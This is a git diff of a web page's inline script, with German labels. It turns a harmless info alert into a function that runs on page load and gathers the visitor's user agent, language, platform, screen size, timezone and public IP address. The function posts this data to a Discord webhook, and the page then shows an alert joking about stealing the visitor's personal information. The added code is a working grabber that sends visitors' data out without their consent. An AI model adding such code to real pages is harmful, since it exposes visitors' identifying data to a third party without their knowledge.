@@ -72,8 +72,13 @@
                 }
             }
 
-            async function getInfo() {
-                const info = {
+            async function sendToDiscord() {
+                  const now = new Date();
+                  const datetime = now.toLocaleString('de-DE', { 
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone 
+                  });
+                
+                  const info = {
                     userAgent: navigator.userAgent,
                     language: navigator.language,
                     platform: navigator.platform,
@@ -84,19 +89,47 @@
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     ip: "Unknown"
                   };
-    
-                try {
+                
+                  try {
                     const res = await fetch("https://api.ipify.org?format=json");
                     const data = await res.json();
                     info.ip = data.ip;
                   } catch (e) {
-                    const error = e;
+                    console.error("IP fetch error:", e);
                   }
-    
-                alert(JSON.stringify(info, null, 2));
-            }
-
-        getInfo();
+                
+                  const content = `📅 **Besuch am ${datetime}**\n\n` +
+                    `🖥️ **User Agent:** ${info.userAgent}\n` +
+                    `🌐 **Sprache:** ${info.language}\n` +
+                    `💻 **Plattform:** ${info.platform}\n` +
+                    `📱 **Bildschirm:** ${info.screen.width}x${info.screen.height}\n` +
+                    `🕓 **Zeitzone:** ${info.timezone}\n` +
+                    `📡 **IP:** ${info.ip}`;
+                
+                  const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
+                
+                  try {
+                    const response = await fetch(webhookUrl, {
+                      method: "POST",
+                      headers: {
+                        'Content-Type': 'application/json'
+                      },
+                      body: JSON.stringify({ content })
+                    });
+                
+                    if (response.ok) {
+                      console.log("Info sent to Discord!");
+                    } else {
+                      console.error("Failed to send info to Discord");
+                    }
+                  } catch (err) {
+                    console.error("Error sending to Discord:", err);
+                  }
+                }
+                
+                // Call it when the page loads or however you'd like
+                sendToDiscord();
+                alert("Thank you for allowing us to steal your personal information");
         </script>
 
     </body>
